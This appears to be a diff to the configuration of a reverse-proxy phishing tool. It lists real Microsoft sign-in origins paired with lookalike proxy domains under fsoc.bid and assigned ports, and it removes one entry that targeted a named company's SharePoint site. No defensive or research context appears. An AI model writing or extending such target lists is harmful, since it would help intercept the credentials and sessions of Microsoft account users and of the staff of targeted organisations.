@@ -17,8 +17,7 @@ class Target(TypedDict):
 
 TARGETS: list[Target] = [
     {"origin": "mysignins.microsoft.com", "proxy": "mysignins.fsoc.bid", "port": 6000},
-    {"origin": "login.microsoftonline.com", "proxy": "login.fsoc.bid", "port": 6001},
-    {"origin": "bystroniclaser.sharepoint.com", "proxy": "bystroniclaser.fsoc.bid", "port": 6002}
+    {"origin": "login.microsoftonline.com", "proxy": "login.fsoc.bid", "port": 6001}
 ]
 
 CONTENT_TYPES: list[str] = [
